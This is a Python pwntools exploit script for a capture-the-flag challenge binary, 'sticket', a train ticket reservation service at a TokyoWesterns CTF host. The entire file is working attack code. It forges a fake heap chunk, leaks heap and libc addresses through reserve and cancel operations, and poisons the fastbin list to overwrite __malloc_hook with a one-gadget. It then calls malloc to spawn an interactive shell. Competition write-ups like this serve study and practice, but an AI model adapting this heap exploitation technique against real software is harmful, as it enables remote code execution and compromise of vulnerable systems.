#!/usr/bin/python
from pwn import *
import sys

HOST = "pwn1.chal.ctf.westerns.tokyo"
PORT = 31729

def reserve(stationon, stationoff, carno, seatno, commlen, comment, nosendl=False):
	r.sendline("1")	
	r.sendlineafter("Station to get on >> ", stationon)
	r.sendlineafter("Station to get off >> ", stationoff)
	r.sendlineafter("Car number(1-16) >> ", carno)
	r.sendlineafter("Seat number(1-20) >> ", seatno)
	r.sendlineafter("Comment length >> ", commlen)

	if commlen != "0":
		if nosendl:
			r.sendafter("Comment >> ", comment)
		else:
			r.sendlineafter("Comment >> ", comment)
	
	r.recvuntil(">> ")

def confirm():
	r.sendline("2")
	data = r.recvuntil(">> ")
	return data

def cancel(id):
	r.sendline("3")
	r.sendlineafter(">> ", str(id))
	r.recvuntil(">> ")


def logout(payload, receiveAdditional = False):
	r.sendline("0")
	r.recvuntil(":")
	r.sendline(payload)
	r.recvuntil(">> ")

	if (receiveAdditional):
		r.recvuntil(":")
		r.sendline("A")
		r.recvuntil(">> ")


def exploit(r):

	log.info("Initial login (Create fake chunk in name")

	payload = "A"*8	
	payload += p64(0x21)
	payload += p64(0x0) + p64(0x0)	
	payload += p64(0x0)
	payload += p64(0x21)
	payload += p8(0)*(88-len(payload))
	payload += p64(0x602230)[:6]

	r.sendlineafter(":", payload)

	log.info("Relogin")
	r.sendlineafter(":", "AAAA")
	r.recvuntil(">> ")

	log.info("Leaking heap and libc addresses")

	reserve("01", "02", "03", "04", "30", "AAAABBBB")
	reserve("01", "02", "03", "04", "30", "AAAABBBB")
	reserve("01", "02", "03", "04", "30", "AAAABBBB")
	reserve("01", "02", "03", "04", "50", "AAAABBBB")
	
	cancel(3)
	cancel(2)
	cancel(1)

	reserve("01", "02", "03", "04", "0", "")	
	r.recvuntil(">> ")	
	
	LEAK = confirm()[110:]
	HEAPLEAK = u64(LEAK[:LEAK.index("\n")].ljust(8, "\x00"))

	log.info("HEAP leak         : %s" % hex(HEAPLEAK))

	logout("A")

	reserve("01", "02", "03", "04", "255", "AAAABBBB")
	reserve("01", "02", "03", "04", "255", "AAAABBBB")
	reserve("01", "02", "03", "04", "255", "AAAABBBB")
	reserve("01", "02", "03", "04", "255", "AAAABBBB")
	reserve("01", "00", "03", "04", "255", "AAAABBBB")
		
	cancel(2)

	reserve("01", "02", "03", "04", "0", "AAAABBBB")
	r.recvuntil(">>")
	
	LEAK = u64(confirm()[213:213+6]+"\x00\x00")

	log.info("LIBC leak         : %s" % hex(LEAK))
	
	LIBC = LEAK - 0x3c4c78

	log.info("LIBC base         : %s" % hex(LIBC))
	
	reserve("33", "00", "03", "04", "40", "ZZZZ")
	reserve("33", "00", "03", "04", "100", "ZZZZ")

	log.info("Put fake chunk in name into fastbin list")	
	cancel(0)

	log.info("Overwrite fake name chunk")

	payload = "Y"*88
	payload += p64(0x21)
	payload += "\x00\x00"

	reserve("33", "00", "03", "04", "100", payload, True)

	payload = "Y"*8
	payload += p64(0x21)
	payload += "Y"*81

	reserve("33", "00", "03", "04", "100", payload)

	cancel(9)
	
	payload = "A"*8	
	payload += p64(0x21)
	payload += p64(0x0) + p64(0x0)
	payload += p64(0x0)
	payload += p64(0x21)
	payload += p8(0x0)*(88-len(payload))
	payload += p64(0x602230)[:6]

	logout(payload, True)

	cancel(0)

	log.info("Overwrite FD pointer for fake chunk in name")

	payload = "A"*8	
	payload += p64(0x21)	
	payload += p64(HEAPLEAK + 0x6e0)
	payload += p64(0x602220)

	logout(payload)
	
	log.info("Allocate chunk to overwrite FD pointer on heap with MALLOC_HOOK_TARGET")

	MALLOC_HOOK_TARGET = LEAK - 0x18b

	payload = "A"*8
	payload += p64(0x71)
	payload += p64(MALLOC_HOOK_TARGET)[:7]

	reserve("01", "02", "03", "04", "24", payload, True)

	logout("AAAA")

	log.info("Allocate chunk to get MALLOC_HOOK_TARGET into fastbin list")
	
	reserve("01", "02", "03", "04", "100", "AAAA")

	log.info("Reserve chunk to overwrite malloc hook (with one gadget)")

	ONE = LIBC + 0x4526a

	payload = p8(0)*19
	payload += p64(ONE)

	reserve("01", "02", "03", "04", "100", payload)	

	log.info("Call malloc to trigger one gadget")	

	r.sendline("1")

	r.interactive()
	
	return

if __name__ == "__main__":
	if len(sys.argv) > 1:		
		r = remote(HOST, PORT)
		exploit(r)
	else:
		r = process("./sticket", env={"LD_PRELOAD" : "./libc.so.6"})
		print util.proc.pidof(r)
		pause()
		exploit(r)
